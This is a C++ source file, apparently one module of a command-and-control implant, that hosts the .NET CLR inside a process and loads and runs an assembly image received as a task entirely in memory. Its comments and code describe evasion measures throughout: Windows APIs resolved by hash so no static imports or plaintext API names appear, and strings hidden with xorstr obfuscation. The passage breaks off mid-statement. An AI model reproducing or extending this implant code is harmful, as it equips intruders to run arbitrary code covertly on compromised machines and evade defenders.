// ========================================== { START OF FILE } ========================================== //
#ifdef _WIN32

#include <Windows.h>
#include <mscoree.h>
#include <oaidl.h>
#include <oleauto.h>

#include <array>
#include <cstdint>
#include <cstring>
#include <cwchar>
#include <exception>
#include <initializer_list>
#include <memory>
#include <string>
#include <vector>

#include "agent/commands/exec/netasm.h"
#include "agent/util/api_resolver.h"
#include "agent/util/strings.h"
#include "agent/util/trace.h"
#include "base64.hpp"
#include "xorstr/xorstr.hpp"

// Reference: gred's ".Net assembly execution" on clean/test (9a8c400, merge cd194db) — Agent::DotnetExecute
// in Agent/src/Agent.cpp with the generated include/mscorlib.h. This tree keeps the technique and applies
// its own rules:
//   - the 120k-line mscorlib.h is not shipped. mingw has no metahost.h, so ICLRMetaHost/ICLRRuntimeInfo
//     are hand-declared in the SDK's documented method order, and the _AppDomain/_Assembly/_MethodInfo
//     slots are read from the runtime's own mscorlib.tlb via ITypeInfo::GetFuncDesc(...)->oVft. The call
//     signature stays static: the ABI cannot be synthesised safely at runtime, the slot index can.
//   - every CLR entry point is resolved by hash (api_resolver.h), so the payload emits no static import
//     for mscoree/oleaut32/shell32 and no plaintext API name.
//   - the legacy `goto` cleanup became RAII and early returns (AGENTS.md), and the console-redirect half
//     is gone: Invoke_3 does not capture a managed console, so this reports what it actually did.
//   - every failure names the stage and the HRESULT instead of reporting success.
//
// The slot offsets are validated against the layout reference on every run: if a runtime ships a tlb whose
// oVft disagrees with those indices, the task fails loudly instead of calling into the middle of a vtable.

namespace agent::commands::exec {

    namespace {

        using models::CheckinResponse;

        // CLR hosting identifiers. mscoree.h (mingw) declares ICorRuntimeHost and both of its GUIDs, but
        // guiddef.h only *defines* a GUID under INITGUID, so without it they are unresolved externs (and
        // libuuid does not export them). Defining the values here keeps the link self-contained, exactly
        // as src/commands/exec/wintask.cpp does for the Task Scheduler GUIDs.
        constexpr GUID k_clsid_cor_runtime_host = {.Data1 = 0xCB2F6723,
                                                   .Data2 = 0xAB3A,
                                                   .Data3 = 0x11D2,
                                                   .Data4 = {0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E}};
        constexpr GUID k_iid_cor_runtime_host = {.Data1 = 0xCB2F6722,
                                                 .Data2 = 0xAB3A,
                                                 .Data3 = 0x11D2,
                                                 .Data4 = {0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E}};
        // Both metahost GUIDs live in metahost.h, which mingw does not ship.
        constexpr GUID k_clsid_clr_meta_host = {.Data1 = 0x9280188D,
                                                .Data2 = 0x0E8E,
                                                .Data3 = 0x4867,
                                                .Data4 = {0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE}};
        constexpr GUID k_iid_iclr_meta_host = {.Data1 = 0xD332DB9E,
                                               .Data2 = 0xB9B3,
                                               .Data3 = 0x4125,
                                               .Data4 = {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
        constexpr GUID k_iid_iclr_runtime_info = {.Data1 = 0xBD39D1D2,
                                                  .Data2 = 0xBA2F,
                                                  .Data3 = 0x486A,
                                                  .Data4 = {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};

        // Slot indices from the layout reference (the legacy include/mscorlib.h, generated from this tlb):
        // _AppDomainVtbl is 70 slots with Load_3 at 45, _AssemblyVtbl has get_EntryPoint at 16, and
        // _MethodInfoVtbl has GetParameters at 18 and Invoke_3 at 37. oVft is the byte offset from the
        // start of the vtable and includes the IUnknown/IDispatch prefix, so slot = oVft / sizeof(void*).
        constexpr std::uint16_t k_slot_app_domain_load_3 = 45;
        constexpr std::uint16_t k_slot_assembly_entry_point = 16;
        constexpr std::uint16_t k_slot_method_info_get_parameters = 18;
        constexpr std::uint16_t k_slot_method_info_invoke_3 = 37;

        /// ICLRMetaHost, hand-declared: mingw ships no metahost.h. Only GetRuntime is needed and it is the
        /// interface's first method after IUnknown, so the order below is the whole prefix it needs.
        /// Reference: metahost.h, ICLRMetaHost. A COM container is never deleted through this type, so the
        /// destructor is non-virtual and protected (the interfaces are ref-counted, not owned).
        struct ICLRMetaHost : public IUnknown {
            virtual HRESULT STDMETHODCALLTYPE GetRuntime(LPCWSTR version, REFIID riid, LPVOID* runtime) = 0;

            ICLRMetaHost(const ICLRMetaHost&) = delete;
            ICLRMetaHost& operator=(const ICLRMetaHost&) = delete;
            ICLRMetaHost(ICLRMetaHost&&) = delete;
            ICLRMetaHost& operator=(ICLRMetaHost&&) = delete;

           protected:
            ~ICLRMetaHost() = default;
        };

        /// ICLRRuntimeInfo, hand-declared. Every method up to the last one this port calls (IsLoadable,
        /// index 8) is declared in the SDK's order, because a missing one shifts the vtable.
        /// Reference: metahost.h, ICLRRuntimeInfo.
        struct ICLRRuntimeInfo : public IUnknown {
            virtual HRESULT STDMETHODCALLTYPE GetVersionString(LPWSTR buffer, DWORD* length) = 0;
            virtual HRESULT STDMETHODCALLTYPE GetRuntimeDirectory(LPWSTR buffer, DWORD* length) = 0;
            virtual HRESULT STDMETHODCALLTYPE IsLoaded(HANDLE process, BOOL* loaded) = 0;
            virtual HRESULT STDMETHODCALLTYPE LoadErrorString(UINT resource_id, LPWSTR buffer, DWORD* length,
                                                              LONG locale_id) = 0;
            virtual HRESULT STDMETHODCALLTYPE LoadLibrary(LPCWSTR dll_name, HMODULE* module) = 0;
            virtual HRESULT STDMETHODCALLTYPE GetProcAddress(LPCSTR proc_name, LPVOID* address) = 0;
            virtual HRESULT STDMETHODCALLTYPE GetInterface(REFCLSID clsid, REFIID riid, LPVOID* unknown) = 0;
            virtual HRESULT STDMETHODCALLTYPE IsLoadable(BOOL* loadable) = 0;

            ICLRRuntimeInfo(const ICLRRuntimeInfo&) = delete;
            ICLRRuntimeInfo& operator=(const ICLRRuntimeInfo&) = delete;
            ICLRRuntimeInfo(ICLRRuntimeInfo&&) = delete;
            ICLRRuntimeInfo& operator=(ICLRRuntimeInfo&&) = delete;

           protected:
            ~ICLRRuntimeInfo() = default;
        };

        /// CLRCreateInstance from mscoree.dll. mingw's mscoree.h does not declare it, and the payload must
        /// not emit a static import for mscoree, so the signature is declared here and resolved by hash.
        using clr_create_instance_t = HRESULT(WINAPI*)(REFCLSID clsid, REFIID riid, LPVOID* instance);

        /// The oleaut32 entry points used to load the type library and marshal the arguments. Resolved by
        /// hash like every other Win32 API in this payload.
        struct OleAut32 {
            decltype(&LoadTypeLib) load_type_lib = nullptr;
            decltype(&SysAllocString) sys_alloc_string = nullptr;
            decltype(&SysFreeString) sys_free_string = nullptr;
            decltype(&SafeArrayCreate) safe_array_create = nullptr;
            decltype(&SafeArrayCreateVector) safe_array_create_vector = nullptr;
            decltype(&SafeArrayPutElement) safe_array_put_element = nullptr;
            decltype(&SafeArrayDestroy) safe_array_destroy = nullptr;

            [[nodiscard]] bool complete() const {
                return load_type_lib != nullptr && sys_alloc_string != nullptr && sys_free_string != nullptr &&
                       safe_array_create != nullptr && safe_array_create_vector != nullptr &&
                       safe_array_put_element != nullptr && safe_array_destroy != nullptr;
            }
        };

        /// COM release at scope exit. Release is a vtable call, so no import is emitted.
        template <typename Interface>
        struct ComRelease {
            void operator()(Interface* pointer) const {
                if (pointer != nullptr) {
                    pointer->Release();
                }
            }
        };

        template <typename Interface>
        using ComPtr = std::unique_ptr<Interface, ComRelease<Interface>>;

        /// Owns the thread's COM apartment: CoInitializeEx on construction, CoUninitialize at scope exit
        /// only when the initialisation succeeded.
        class ComApartment {
           public:
            ComApartment() = default;
            ~ComApartment() {
                if (uninitialize_ != nullptr) {
                    uninitialize_();
                }
            }
            ComApartment(const ComApartment&) = delete;
            ComApartment& operator=(const ComApartment&) = delete;
            ComApartment(ComApartment&&) = delete;
            ComApartment& operator=(ComApartment&&) = delete;

            /// Resolves ole32 and enters a single-threaded apartment. RPC_E_CHANGED_MODE is accepted: the
            /// thread is then already in an apartment, and the CLR host works in an MTA too.
            [[nodiscard]] CommandResult Initialize();

           private:
            decltype(&CoUninitialize) uninitialize_ = nullptr;
        };

        /// Frees a BSTR at scope exit (ITypeInfo::GetDocumentation allocates with SysAllocString).
        class BstrName {
           public:
            explicit BstrName(decltype(&SysFreeString) free_string) : free_string_(free_string) {}
            ~BstrName() {
                if (free_string_ != nullptr && value_ != nullptr) {
                    free_string_(value_);
                }
            }
            BstrName(const BstrName&) = delete;
            BstrName& operator=(const BstrName&) = delete;
            BstrName(BstrName&&) = delete;
            BstrName& operator=(BstrName&&) = delete;

            [[nodiscard]] BSTR get() const { return value_; }
            void Set(BSTR value) { value_ = value; }
            /// Hands the string to the caller, which then owns it.
            [[nodiscard]] BSTR Release() {
                BSTR released = value_;
                value_ = nullptr;
                return released;
            }

           private:
            BSTR value_ = nullptr;
            decltype(&SysFreeString) free_string_ = nullptr;
        };

        /// Destroys a SAFEARRAY at scope exit.
        class SafeArray {
           public:
            SafeArray(SAFEARRAY* array, decltype(&SafeArrayDestroy) destroy) : array_(array), destroy_(destroy) {}
            ~SafeArray() {
                if (destroy_ != nullptr && array_ != nullptr) {
                    destroy_(array_);
                }
            }
            SafeArray(const SafeArray&) = delete;
            SafeArray& operator=(const SafeArray&) = delete;
            SafeArray(SafeArray&&) = delete;
            SafeArray& operator=(SafeArray&&) = delete;

            [[nodiscard]] SAFEARRAY* get() const { return array_; }

            /// Gives up ownership so the array can be handed to a callee that destroys it.
            [[nodiscard]] SAFEARRAY* Release() {
                SAFEARRAY* released = array_;
                array_ = nullptr;
                return released;
            }

           private:
            SAFEARRAY* array_ = nullptr;
            decltype(&SafeArrayDestroy) destroy_ = nullptr;
        };

        [[nodiscard]] std::string ToHex(const std::uint32_t value) {
            std::string hex(8, '0');
            for (std::size_t index = 0; index < hex.size(); ++index) {
                const auto digit = static_cast<std::uint32_t>((value >> ((hex.size() - 1 - index) * 4)) & 0xFU);
                hex[index] = static_cast<char>(digit < 10 ? ('0' + digit) : ('A' + digit - 10));
            }
            return hex;
        }

        [[nodiscard]] CommandResult HresultFailure(const char* stage, HRESULT hr) {
            return CommandResult::Error(xorstr_("NET_ASM failed: ") + std::string{stage} +
                                        xorstr_(" returned HRESULT 0x") + ToHex(static_cast<std::uint32_t>(hr)));
        }

        /// One resolved vtable slot: the byte offset the type library reports, plus the DISPID that named
        /// it, so a mismatch can be diagnosed from a guest trace.
        struct Slot {
            std::uint16_t o_vft = 0;
            int memid = 0;
            bool found = false;
        };

        /// The slots the CLR host needs, and the IID of _AppDomain read from the same type library (the
        /// legacy header's __uuidof(mscorlib::_AppDomain)).
        struct ClrSlots {
            Slot load_3;
            Slot entry_point;
            Slot get_parameters;
            Slot invoke_3;
            GUID app_domain_iid{};

            [[nodiscard]] bool complete() const {
                return load_3.found && entry_point.found && get_parameters.found && invoke_3.found;
            }
        };

        /// Reads the name of a type info's type (MEMBERID_NIL) or of one of its members.
        [[nodiscard]] bool ReadName(ITypeInfo* info, MEMBERID memid, BstrName& out) {
            DWORD context = 0;
            BSTR value = nullptr;
            if (FAILED(info->GetDocumentation(memid, &value, nullptr, &context, nullptr))) {
                return false;
            }
            out.Set(value);
            return true;
        }

        [[nodiscard]] bool NameEquals(BSTR value, const wchar_t* expected) {
            return value != nullptr && std::wcscmp(value, expected) == 0;
        }

        /// Scans one type info for a member whose name is in `names`, recording its oVft and DISPID.
        /// `names` are xorstr_ temporaries valid for the duration of the call only.
        void FindMember(ITypeInfo* info, const OleAut32& ole, std::initializer_list<const wchar_t*> names, Slot& slot) {
            TYPEATTR* attributes = nullptr;
            if (FAILED(info->GetTypeAttr(&attributes)) || attributes == nullptr) {
                return;
            }
            const WORD function_count = attributes->cFuncs;
            info->ReleaseTypeAttr(attributes);

            for (WORD index = 0; index < function_count; ++index) {
                if (slot.found) {
                    return;
                }
                FUNCDESC* function = nullptr;
                if (FAILED(info->GetFuncDesc(index, &function)) || function == nullptr) {
                    continue;
                }
                BstrName member{ole.sys_free_string};
                const bool named = ReadName(info, function->memid, member);
                bool matches = false;
                for (const wchar_t* candidate : names) {
                    matches = matches || (named && NameEquals(member.get(), candidate));
                }
                if (matches) {
                    slot.o_vft = static_cast<std::uint16_t>(function->oVft);
                    slot.memid = function->memid;
                    slot.found = true;
                }
                info->ReleaseFuncDesc(function);
            }
        }

        /// Checks one resolved offset against the layout-reference index. A tlb whose oVft disagrees would
        /// make the call land in the middle of a vtable, so the task fails instead of crashing the payload.
        [[nodiscard]] CommandResult ValidateSlot(const Slot& slot, std::uint16_t expected, const char* name) {
            const auto index = static_cast<std::uint16_t>(slot.o_vft / sizeof(void*));
            AGENT_TRACE_LOG(xorstr_("netasm"), xorstr_("slot "), name, xorstr_(" oVft="), slot.o_vft,
                            xorstr_(" index="), index, xorstr_(" memid="), slot.memid);
            if (index != expected) {
                return CommandResult::Error(xorstr_("NET_ASM failed: mscorlib.tlb reports slot ") +
                                            std::to_string(index) + xorstr_(" for ") + std::string{name} +
                                            xorstr_(", the layout reference expects ") + std::to_string(expected) +
                                            xorstr_(" - refusing to call it"));
            }
            return CommandResult::Ok({});
        }

        /// Reads the slots out of one type library.
        [[nodiscard]] CommandResult ScanTypeLibrary(ITypeLib* library, const OleAut32& ole, ClrSlots& slots) {
            bool have_app_domain = false;
            const UINT type_count = library->GetTypeInfoCount();
            for (UINT index = 0; index < type_count; ++index) {
                ITypeInfo* raw_info = nullptr;
                if (FAILED(library->GetTypeInfo(index, &raw_info)) || raw_info == nullptr) {
                    continue;
                }
                const ComPtr<ITypeInfo> info{raw_info};

                BstrName type_name{ole.sys_free_string};
                if (!ReadName(info.get(), MEMBERID_NIL, type_name)) {
                    continue;
                }
                const bool is_app_domain = NameEquals(type_name.get(), xorstr_(L"_AppDomain"));
                const bool is_assembly = NameEquals(type_name.get(), xorstr_(L"_Assembly"));
                const bool is_method_info = NameEquals(type_name.get(), xorstr_(L"_MethodInfo"));
                if (!is_app_domain && !is_assembly && !is_method_info) {
                    continue;
                }

                if (is_app_domain && !have_app_domain) {
                    TYPEATTR* attributes = nullptr;
                    if (SUCCEEDED(info->GetTypeAttr(&attributes)) && attributes != nullptr) {
                        slots.app_domain_iid = attributes->guid;
                        info->ReleaseTypeAttr(attributes);
                        have_app_domain = true;
                    }
                    FindMember(info.get(), ole, {xorstr_(L"Load_3")}, slots.load_3);
                } else if (is_assembly) {
                    // The legacy header calls it get_EntryPoint; the type library names the property
                    // "EntryPoint", so both spellings are accepted.
                    FindMember(info.get(), ole, {xorstr_(L"get_EntryPoint"), xorstr_(L"EntryPoint")},
                               slots.entry_point);
                } else if (is_method_info) {
                    FindMember(info.get(), ole, {xorstr_(L"GetParameters")}, slots.get_parameters);
                    FindMember(info.get(), ole, {xorstr_(L"Invoke_3")}, slots.invoke_3);
                }

                if (slots.complete() && have_app_domain) {
                    break;
                }
            }

            if (!slots.complete() || !have_app_domain) {
                const std::string message{xorstr_("NET_ASM failed: mscorlib.tlb does not describe the CLR ")};
                return CommandResult::Error(message + xorstr_("hosting interfaces it needs (Load_3, EntryPoint, ") +
                                            xorstr_("GetParameters, Invoke_3, _AppDomain)"));
            }
            return CommandResult::Ok({});
        }

        /// Reads the slot offsets from the runtime's own mscorlib.tlb, so neither the generated header nor a
        /// hardcoded vtable is needed, then validates them against the layout reference.
        [[nodiscard]] CommandResult ResolveSlots(const std::wstring& type_library_path, const OleAut32& ole,
                                                 ClrSlots& slots) {
            ITypeLib* raw_library = nullptr;
            const HRESULT loaded = ole.load_type_lib(type_library_path.c_str(), &raw_library);
            if (FAILED(loaded) || raw_library == nullptr) {
                return HresultFailure(xorstr_("LoadTypeLib(mscorlib.tlb)"), loaded);
            }
            const ComPtr<ITypeLib> library{raw_library};

            CommandResult scanned = ScanTypeLibrary(library.get(), ole, slots);
            if (!scanned.success) {
                return scanned;
            }

            const std::array<CommandResult, 4> checks{
                ValidateSlot(slots.load_3, k_slot_app_domain_load_3, xorstr_("_AppDomain::Load_3")),
                ValidateSlot(slots.entry_point, k_slot_assembly_entry_point, xorstr_("_Assembly::get_EntryPoint")),
                ValidateSlot(slots.get_parameters, k_slot_method_info_get_parameters,
                             xorstr_("_MethodInfo::GetParameters")),
                ValidateSlot(slots.invoke_3, k_slot_method_info_invoke_3, xorstr_("_MethodInfo::Invoke_3"))};
            for (const CommandResult& check : checks) {
                if (!check.success) {
                    return check;
                }
            }
            return CommandResult::Ok({});
        }

        /// Builds the SAFEARRAY(VT_UI1) that carries the assembly image into _AppDomain::Load_3.
        [[nodiscard]] SAFEARRAY* CreateImageArray(const OleAut32& ole, const std::vector<BYTE>& image) {
            SAFEARRAYBOUND bound{};
            // The wire payload is a single assembly image; ULONG is the widest the marshaller accepts.
            if (image.size() > 0xFFFFFFFFULL) {
                return nullptr;
            }
            bound.cElements = static_cast<ULONG>(image.size());
            bound.lLbound = 0;
            SAFEARRAY* array = ole.safe_array_create(VT_UI1, 1, &bound);
            if (array == nullptr) {
                return nullptr;
            }
            if (array->pvData == nullptr || array->cbElements != 1) {
                ole.safe_array_destroy(array);
                return nullptr;
            }
            std::memcpy(array->pvData, image.data(), image.size());
            return array;
        }

        /// Splits Command.Arguements the way the shell would, so a quoted argument survives.
        [[nodiscard]] bool SplitArguments(const std::string& arguments, std::vector<std::wstring>& out) {
            if (arguments.empty()) {
                return true;
            }
            const HMODULE shell32 = agent::util::get_module(xorstr_("shell32.dll"));
            const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
            if (shell32 == nullptr || kernel32 == nullptr) {
                return false;
            }
            const auto command_line_to_argv =
                agent::util::resolve_api<decltype(&CommandLineToArgvW)>(shell32, xorstr_("CommandLineToArgvW"));
            const auto local_free = agent::util::resolve_api<decltype(&LocalFree)>(kernel32, xorstr_("LocalFree"));
            if (command_line_to_argv == nullptr || local_free == nullptr) {
                return false;
            }

            const std::wstring wide = agent::util::ToWide(arguments);
            int count = 0;
            LPWSTR* argv = command_line_to_argv(wide.c_str(), &count);
            if (argv == nullptr) {
                return false;
            }
            out.reserve(static_cast<std::size_t>(count));
            for (int index = 0; index < count; ++index) {
                out.emplace_back(argv[index]);
            }
            local_free(reinterpret_cast<HLOCAL>(argv));
            return true;
        }

        /// Builds the SAFEARRAY(VT_VARIANT) holding one SAFEARRAY(VT_BSTR) of arguments, the shape
        /// _MethodInfo::Invoke_3 expects for a `static int Main(string[] args)` entry point.
        [[nodiscard]] CommandResult CreateArgumentsArray(const OleAut32& ole,
                                                         const std::vector<std::wstring>& arguments, SAFEARRAY*& out) {
            SAFEARRAY* strings = ole.safe_array_create_vector(VT_BSTR, 0, static_cast<ULONG>(arguments.size()));
            if (strings == nullptr) {
                return CommandResult::Error(xorstr_("NET_ASM failed: SafeArrayCreateVector(VT_BSTR) failed"));
            }
            const SafeArray string_array{strings, ole.safe_array_destroy};
            for (std::size_t index = 0; index < arguments.size(); ++index) {
                BSTR value = ole.sys_alloc_string(arguments[index].c_str());
                if (value == nullptr) {
                    return CommandResult::Error(xorstr_("NET_ASM failed: SysAllocString failed"));
                }
                LONG position = static_cast<LONG>(index);
                const HRESULT put = ole.safe_array_put_element(string_array.get(), &position, value);
                ole.sys_free_string(value);  // SafeArrayPutElement copies a BSTR
                if (FAILED(put)) {
                    return HresultFailure(xorstr_("SafeArrayPutElement(VT_BSTR)"), put);
                }
            }

            SAFEARRAY* variants = ole.safe_array_create_vector(VT_VARIANT, 0, 1);
            if (variants == nullptr) {
                return CommandResult::Error(xorstr_("NET_ASM failed: SafeArrayCreateVector(VT_VARIANT) failed"));
            }
            SafeArray variant_array{variants, ole.safe_array_destroy};

            VARIANT holder;
            VariantInit(&holder);
            // NOLINTNEXTLINE(cppcoreguidelines-pro-type-union-access) // a VARIANT is a union by definition
            holder.vt = VT_ARRAY | VT_BSTR;
            // NOLINTNEXTLINE(cppcoreguidelines-pro-type-union-access) // a VARIANT is a union by definition
            holder.parray = string_array.get();
            LONG first = 0;
            // NOLINTNEXTLINE(cppcoreguidelines-pro-type-union-access) // a VARIANT is a union by definition
            const HRESULT put = ole.safe_array_put_element(variant_array.get(), &first, &holder);
            if (FAILED(put)) {
                return HresultFailure(xorstr_("SafeArrayPutElement(VT_VARIANT)"), put);
            }

            out = variant_array.Release();
            return CommandResult::Ok({});
        }

        /// Reads the slot's function pointer out of the object's vtable.
        template <typename Function>
        [[nodiscard]] Function AtSlot(void* object, std::uint16_t o_vft) {
            auto** vtable = *reinterpret_cast<void***>(object);
            auto* entry = vtable + (o_vft / sizeof(void*));
            return reinterpret_cast<Function>(*entry);
        }

        // The static signatures behind the runtime-resolved slots. ABI, not layout: the legacy header
        // declares the same shapes (mscorlib.h, _AppDomain::Load_3 / _Assembly::get_EntryPoint /
        // _MethodInfo::GetParameters / _MethodInfo::Invoke_3).
        using load_3_t = HRESULT(STDMETHODCALLTYPE*)(void* self, SAFEARRAY* raw_assembly, void** assembly);
        using get_entry_point_t = HRESULT(STDMETHODCALLTYPE*)(void* self, void** method_info);
        using get_parameters_t = HRESULT(STDMETHODCALLTYPE*)(void* self, SAFEARRAY** parameters);
        using invoke_3_t = HRESULT(STDMETHODCALLTYPE*)(void* self, VARIANT target, SAFEARRAY* parameters,
                                                       VARIANT* result);

        /// Hosts the runtime and returns its ICorRuntimeHost, already started.
        [[nodiscard]] CommandResult OpenRuntimeHost(const OleAut32& ole, ComPtr<ICorRuntimeHost>& host,
                                                    ClrSlots& slots) {
            const HMODULE mscoree = agent::util::get_module(xorstr_("mscoree.dll"));
            if (mscoree == nullptr) {
                return CommandResult::Error(xorstr_("NET_ASM failed: mscoree.dll is unavailable"));
            }
            const auto clr_create_instance =
                agent::util::resolve_api<clr_create_instance_t>(mscoree, xorstr_("CLRCreateInstance"));
            if (clr_create_instance == nullptr) {
                return CommandResult::Error(xorstr_("NET_ASM failed: CLRCreateInstance could not be resolved"));
            }

            ICLRMetaHost* raw_meta_host = nullptr;
            HRESULT hr = clr_create_instance(k_clsid_clr_meta_host, k_iid_iclr_meta_host,
                                             reinterpret_cast<void**>(&raw_meta_host));
            if (FAILED(hr) || raw_meta_host == nullptr) {
                return HresultFailure(xorstr_("CLRCreateInstance"), hr);
            }
            const ComPtr<ICLRMetaHost> meta_host{raw_meta_host};

            ICLRRuntimeInfo* raw_runtime_info = nullptr;
            hr = meta_host->GetRuntime(xorstr_(L"v4.0.30319"), k_iid_iclr_runtime_info,
                                       reinterpret_cast<void**>(&raw_runtime_info));
            if (FAILED(hr) || raw_runtime_info == nullptr) {
                return HresultFailure(xorstr_("ICLRMetaHost::GetRuntime(v4.0.30319)"), hr);
            }
            const ComPtr<ICLRRuntimeInfo> runtime_info{raw_runtime_info};

            BOOL loadable = FALSE;
            hr = runtime_info->IsLoadable(&loadable);
            if (FAILED(hr)) {
                return HresultFailure(xorstr_("ICLRRuntimeInfo::IsLoadable"), hr);
            }
            if (loadable == FALSE) {
                return CommandResult::Error(
                    xorstr_("NET_ASM failed: the v4.0.30319 CLR cannot be loaded into this process"));
            }

            // The runtime's own directory holds the mscorlib.tlb that describes its hosting interfaces.
            std::vector<wchar_t> directory(0x200, L'\0');
            auto length = static_cast<DWORD>(directory.size());
            hr = runtime_info->GetRuntimeDirectory(directory.data(), &length);
            if (hr == HRESULT_FROM_WIN32(ERROR_INSUFFICIENT_BUFFER)) {
                directory.assign(static_cast<std::size_t>(length) + 1, L'\0');
                hr = runtime_info->GetRuntimeDirectory(directory.data(), &length);
            }
            if (FAILED(hr)) {
                return HresultFailure(xorstr_("ICLRRuntimeInfo::GetRuntimeDirectory"), hr);
            }
            std::wstring type_library_path{directory.data()};
            type_library_path += xorstr_(L"\\mscorlib.tlb");

            CommandResult resolved = ResolveSlots(type_library_path, ole, slots);
            if (!resolved.success) {
                return resolved;
            }

            ICorRuntimeHost* raw_host = nullptr;
            hr = runtime_info->GetInterface(k_clsid_cor_runtime_host, k_iid_cor_runtime_host,
                                            reinterpret_cast<void**>(&raw_host));
            if (FAILED(hr) || raw_host == nullptr) {
                return HresultFailure(xorstr_("ICLRRuntimeInfo::GetInterface(ICorRuntimeHost)"), hr);
            }
            host.reset(raw_host);

            hr = host->Start();
            if (FAILED(hr)) {
                host.reset();
                return HresultFailure(xorstr_("ICorRuntimeHost::Start"), hr);
            }
            return CommandResult::Ok({});
        }

        /// Returns the default AppDomain, queried for _AppDomain with the IID the type library reported.
        [[nodiscard]] CommandResult OpenDefaultDomain(ICorRuntimeHost* host, const ClrSlots& slots,
                                                      ComPtr<IUnknown>& app_domain) {
            IUnknown* raw_domain = nullptr;
            HRESULT hr = host->GetDefaultDomain(&raw_domain);
            if (FAILED(hr) || raw_domain == nullptr) {
                return HresultFailure(xorstr_("ICorRuntimeHost::GetDefaultDomain"), hr);
            }
            const ComPtr<IUnknown> domain_thunk{raw_domain};

            void* raw_app_domain = nullptr;
            hr = domain_thunk->QueryInterface(slots.app_domain_iid, &raw_app_domain);
            if (FAILED(hr) || raw_app_domain == nullptr) {
                return HresultFailure(xorstr_("QueryInterface(_AppDomain)"), hr);
            }
            app_domain.reset(static_cast<IUnknown*>(raw_app_domain));
            return CommandResult::Ok({});
        }

        /// Loads the image into the AppDomain and invokes the entry point with the argument vector.
        [[nodiscard]] CommandResult LoadAndInvoke(void* app_domain, const ClrSlots& slots, const OleAut32& ole,
                                                  const std::vector<BYTE>& image, const std::string& arguments) {
            SAFEARRAY* raw_image = CreateImageArray(ole, image);
            if (raw_image == nullptr) {
                return CommandResult::Error(xorstr_("NET_ASM failed: the assembly image could not be marshalled"));
            }
            const SafeArray image_array{raw_image, ole.safe_array_destroy};

            void* assembly = nullptr;
            const auto load_3 = AtSlot<load_3_t>(app_domain, slots.load_3.o_vft);
            HRESULT hr = load_3(app_domain, image_array.get(), &assembly);
            if (FAILED(hr)) {
                return HresultFailure(xorstr_("_AppDomain::Load_3"), hr);
            }
            if (assembly == nullptr) {
                return CommandResult::Error(xorstr_("NET_ASM failed: Load_3 returned no assembly"));
            }
            const ComPtr<IUnknown> assembly_ref{static_cast<IUnknown*>(assembly)};

            void* method_info = nullptr;
            const auto get_entry_point = AtSlot<get_entry_point_t>(assembly_ref.get(), slots.entry_point.o_vft);
            hr = get_entry_point(assembly_ref.get(), &method_info);
            if (FAILED(hr)) {
                return HresultFailure(xorstr_("_Assembly::get_EntryPoint"), hr);
            }
            if (method_info == nullptr) {
                return CommandResult::Error(xorstr_("NET_ASM failed: the assembly has no entry point"));
            }
            const ComPtr<IUnknown> entry_point{static_cast<IUnknown*>(method_info)};

            // The entry point's declared parameters decide whether an argument vector is passed at all: a
            // parameterless Main rejects one.
            SAFEARRAY* raw_parameters = nullptr;
            const auto get_parameters = AtSlot<get_parameters_t>(entry_point.get(), slots.get_parameters.o_vft);
            hr = get_parameters(entry_point.get(), &raw_parameters);
            if (FAILED(hr)) {
                return HresultFailure(xorstr_("_MethodInfo::GetParameters"), hr);
            }
            const SafeArray parameters{raw_parameters, ole.safe_array_destroy};
            const bool takes_arguments =
                raw_parameters != nullptr && raw_parameters->cDims > 0 && raw_parameters->rgsabound[0].cElements > 0;

            std::vector<std::wstring> argument_vector;
            if (!SplitArguments(arguments, argument_vector)) {
                return CommandResult::Error(xorstr_("NET_ASM failed: Arguements could not be parsed"));
            }
            if (!takes_arguments && !argument_vector.empty()) {
                return CommandResult::Error(
                    xorstr_("NET_ASM failed: the assembly entry point takes no parameters but Arguements was set"));
            }

            SAFEARRAY* raw_arguments = nullptr;
            if (takes_arguments) {
                CommandResult built = CreateArgumentsArray(ole, argument_vector, raw_arguments);
                if (!built.success) {
                    return built;
                }
            }
            const SafeArray argument_array{raw_arguments, ole.safe_array_destroy};

            VARIANT target;
            VariantInit(&target);
            VARIANT result;
            VariantInit(&result);
            const auto invoke_3 = AtSlot<invoke_3_t>(entry_point.get(), slots.invoke_3.o_vft);
            AGENT_TRACE_STAGE(xorstr_("netasm invoking entry point"));
            hr = invoke_3(entry_point.get(), target, argument_array.get(), &result);
            VariantClear(&result);
            if (FAILED(hr)) {
                // 0x80131604 (COR_E_TARGETINVOCATION) means the managed entry point itself threw.
                if (static_cast<std::uint32_t>(hr) == 0x80131604U) {
                    return HresultFailure(xorstr_("the managed entry point (_MethodInfo::Invoke_3)"), hr);
                }
                return HresultFailure(xorstr_("_MethodInfo::Invoke_3"), hr);
            }

            // Invoke_3 does not capture the managed console, so the task reports what actually happened and
            // nothing more: the assembly loaded and its entry point returned.
            const std::string message{xorstr_("Assembly loaded into the v4.0.30319 default AppDomain")};
            return CommandResult::Ok(message +
                                     xorstr_(" and its entry point invoked; managed console output is not captured"));
        }

        /// Runs the decoded assembly inside the v4.0.30319 CLR's default AppDomain.
        [[nodiscard]] CommandResult RunInClr(const std::vector<BYTE>& image, const std::string& arguments) {
            ComApartment apartment;
            CommandResult initialized = apartment.Initialize();
            if (!initialized.success) {
                return initialized;
            }

            const HMODULE oleaut32 = agent::util::get_module(xorstr_("oleaut32.dll"));
            if (oleaut32 == nullptr) {
                return CommandResult::Error(xorstr_("NET_ASM failed: oleaut32.dll is unavailable"));
            }
            OleAut32 ole;
            ole.load_type_lib = agent::util::resolve_api<decltype(&LoadTypeLib)>(oleaut32, xorstr_("LoadTypeLib"));
            ole.sys_alloc_string =
                agent::util::resolve_api<decltype(&SysAllocString)>(oleaut32, xorstr_("SysAllocString"));
            ole.sys_free_string =
                agent::util::resolve_api<decltype(&SysFreeString)>(oleaut32, xorstr_("SysFreeString"));
            ole.safe_array_create =
                agent::util::resolve_api<decltype(&SafeArrayCreate)>(oleaut32, xorstr_("SafeArrayCreate"));
            ole.safe_array_create_vector =
                agent::util::resolve_api<decltype(&SafeArrayCreateVector)>(oleaut32, xorstr_("SafeArrayCreateVector"));
            ole.safe_array_put_element =
